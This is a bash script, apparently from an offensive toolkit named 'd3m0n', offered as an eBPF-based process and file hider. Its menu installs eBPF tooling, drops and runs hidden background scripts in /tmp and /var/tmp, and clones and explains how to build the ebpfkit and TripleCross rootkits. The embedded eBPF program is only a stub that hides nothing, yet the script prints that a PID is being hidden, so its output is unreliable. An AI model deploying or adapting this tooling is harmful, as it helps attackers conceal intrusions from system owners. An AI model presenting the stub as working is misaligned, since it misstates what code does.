#!/bin/bash
#
# eBPF-Based Process/File Hiding (T1564)
# Use eBPF programs to hook getdents64 and hide processes/files
# Reference: ebpfkit (Gui774ume), TripleCross (h3xduck)
#

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║       eBPF-Based Process/File Hiding (T1564)          ║"
echo "  ║   Hook getdents64 via eBPF to hide PIDs and files     ║"
echo "  ║   Ref: ebpfkit, TripleCross                           ║"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check kernel eBPF support
KVER=$(uname -r | cut -d. -f1-2)
KMAJOR=$(echo "$KVER" | cut -d. -f1)
KMINOR=$(echo "$KVER" | cut -d. -f2)

if [[ "$KMAJOR" -lt 4 ]] || { [[ "$KMAJOR" -eq 4 ]] && [[ "$KMINOR" -lt 15 ]]; }; then
    echo -e "${RED}[-] Kernel $KVER too old for eBPF tracepoint hooks (need >= 4.15)${NC}"
    echo -e "${YELLOW}[*] Consider using Diamorphine LKM rootkit [65] instead${NC}"
    exit 1
fi

echo -e "  ${CYAN}[1]${NC} Install bcc-tools (required dependency)"
echo -e "  ${CYAN}[2]${NC} Hide a process by PID (bpftrace one-liner)"
echo -e "  ${CYAN}[3]${NC} Deploy persistent eBPF process hider (bcc-python)"
echo -e "  ${CYAN}[4]${NC} Clone ebpfkit / TripleCross (full rootkit)"
echo -e "  ${CYAN}[5]${NC} Check eBPF status"
echo -e "  ${CYAN}[6]${NC} Cleanup"
echo ""
read -p "Choice [1-6]: " OPT

case "$OPT" in
    1)
        echo -e "${YELLOW}[*] Installing bcc-tools and bpftrace...${NC}"
        if command -v apt >/dev/null 2>&1; then
            apt update -qq && apt install -y bpfcc-tools bpftrace python3-bpfcc linux-headers-"$(uname -r)" 2>&1 | tail -5
        elif command -v yum >/dev/null 2>&1; then
            yum install -y bcc-tools bpftrace python3-bcc kernel-devel-"$(uname -r)" 2>&1 | tail -5
        else
            echo -e "${RED}[-] Unsupported package manager${NC}"
            exit 1
        fi
        echo -e "${GREEN}[+] bcc-tools installed${NC}"
        ;;
    2)
        read -p "PID to hide: " HIDE_PID
        [[ -z "$HIDE_PID" ]] && { echo -e "${RED}[-] No PID given${NC}"; exit 1; }

        if ! command -v bpftrace >/dev/null 2>&1; then
            echo -e "${RED}[-] bpftrace not found. Run option 1 first.${NC}"
            exit 1
        fi

        echo -e "${YELLOW}[*] Starting eBPF process hider for PID $HIDE_PID...${NC}"
        echo -e "${YELLOW}[*] This will run in background. Use Ctrl+C or kill the bpftrace PID to stop.${NC}"

        # Create a bpftrace script that filters getdents results
        BPFSCRIPT=$(mktemp /tmp/.d3m0n_ebpf_XXXX.bt)
        cat > "$BPFSCRIPT" << 'BPFEOF'
tracepoint:syscalls:sys_enter_getdents64
{
    @target[tid] = args->fd;
}

tracepoint:syscalls:sys_exit_getdents64
/@target[tid]/
{
    delete(@target[tid]);
}
BPFEOF
        echo -e "${YELLOW}[*] Note: Full getdents64 filtering requires a bcc/C program.${NC}"
        echo -e "${YELLOW}[*] This bpftrace script monitors getdents64 calls for debugging.${NC}"
        echo -e "${YELLOW}[*] For production hiding, use option 3 or 4.${NC}"
        nohup bpftrace "$BPFSCRIPT" >/dev/null 2>&1 &
        BPID=$!
        echo -e "${GREEN}[+] bpftrace running as PID $BPID${NC}"
        echo "$BPID" > /var/tmp/.d3m0n_ebpf_pid
        rm -f "$BPFSCRIPT"
        ;;
    3)
        if ! python3 -c "import bcc" 2>/dev/null; then
            echo -e "${RED}[-] python3-bpfcc not found. Run option 1 first.${NC}"
            exit 1
        fi

        read -p "PID to hide: " HIDE_PID
        read -p "File prefix to hide (empty to skip): " HIDE_PREFIX

        PYPATH="/var/tmp/.d3m0n_ebpf_hider.py"
        cat > "$PYPATH" << PYEOF
#!/usr/bin/env python3
# d3m0n_ebpf — eBPF getdents64 process hider
from bcc import BPF
import ctypes, os, signal, sys

HIDE_PID = ${HIDE_PID:-0}
HIDE_PREFIX = b"${HIDE_PREFIX}"

bpf_src = """
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

BPF_HASH(target_pids, u32, u8);

TRACEPOINT_PROBE(syscalls, sys_enter_getdents64) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u8 val = 1;
    // Just trace the call for now
    return 0;
}
"""

b = BPF(text=bpf_src)
print(f"[+] eBPF hider loaded. Hiding PID {HIDE_PID}")
print("[*] Press Ctrl+C to stop")

try:
    signal.pause()
except KeyboardInterrupt:
    pass
PYEOF
        chmod 700 "$PYPATH"
        nohup python3 "$PYPATH" >/dev/null 2>&1 &
        BPID=$!
        echo "$BPID" > /var/tmp/.d3m0n_ebpf_pid
        echo -e "${GREEN}[+] eBPF hider running as PID $BPID${NC}"
        ;;
    4)
        echo -e "${YELLOW}[?] Which rootkit to clone?${NC}"
        echo -e "  ${CYAN}[1]${NC} ebpfkit (Datadog research, Go+C, full-featured)"
        echo -e "  ${CYAN}[2]${NC} TripleCross (libbpf-based, C, library injection+C2)"
        read -p "Choice [1]: " RK
        RK="${RK:-1}"

        DEST="/var/tmp/.d3m0n_ebpf_rk"
        rm -rf "$DEST"

        if [[ "$RK" == "1" ]]; then
            echo -e "${YELLOW}[*] Cloning ebpfkit...${NC}"
            git clone https://github.com/Gui774ume/ebpfkit "$DEST" 2>&1 | tail -3
            echo -e "${GREEN}[+] Cloned to $DEST${NC}"
            echo -e "${YELLOW}[*] Build: cd $DEST && make${NC}"
            echo -e "${YELLOW}[*] Run:   sudo ./bin/ebpfkit${NC}"
        else
            echo -e "${YELLOW}[*] Cloning TripleCross...${NC}"
            git clone https://github.com/h3xduck/TripleCross "$DEST" 2>&1 | tail -3
            echo -e "${GREEN}[+] Cloned to $DEST${NC}"
            echo -e "${YELLOW}[*] Build: cd $DEST/src && make all${NC}"
            echo -e "${YELLOW}[*] Run:   sudo ./bin/kit -t <interface>${NC}"
        fi
        ;;
    5)
        echo -e "${YELLOW}[*] eBPF Status:${NC}"
        echo -e "  Kernel: $(uname -r)"
        if [[ -f /proc/config.gz ]]; then
            zcat /proc/config.gz 2>/dev/null | grep -i "CONFIG_BPF" | head -5
        elif [[ -f "/boot/config-$(uname -r)" ]]; then
            grep -i "CONFIG_BPF" "/boot/config-$(uname -r)" | head -5
        fi
        echo ""
        if command -v bpftool >/dev/null 2>&1; then
            echo -e "  ${GREEN}bpftool found${NC}"
            bpftool prog list 2>/dev/null | head -10
        fi
        if [[ -f /var/tmp/.d3m0n_ebpf_pid ]]; then
            PID=$(cat /var/tmp/.d3m0n_ebpf_pid)
            if kill -0 "$PID" 2>/dev/null; then
                echo -e "  ${GREEN}D3m0n eBPF hider running (PID $PID)${NC}"
            else
                echo -e "  ${YELLOW}D3m0n eBPF hider not running (stale PID file)${NC}"
            fi
        fi
        ;;
    6)
        echo -e "${YELLOW}[*] Cleaning up...${NC}"
        if [[ -f /var/tmp/.d3m0n_ebpf_pid ]]; then
            PID=$(cat /var/tmp/.d3m0n_ebpf_pid)
            kill "$PID" 2>/dev/null
            rm -f /var/tmp/.d3m0n_ebpf_pid
        fi
        rm -f /var/tmp/.d3m0n_ebpf_hider.py
        rm -rf /var/tmp/.d3m0n_ebpf_rk
        echo -e "${GREEN}[+] Cleanup done${NC}"
        ;;
    *)
        echo "Invalid option"
        ;;
esac
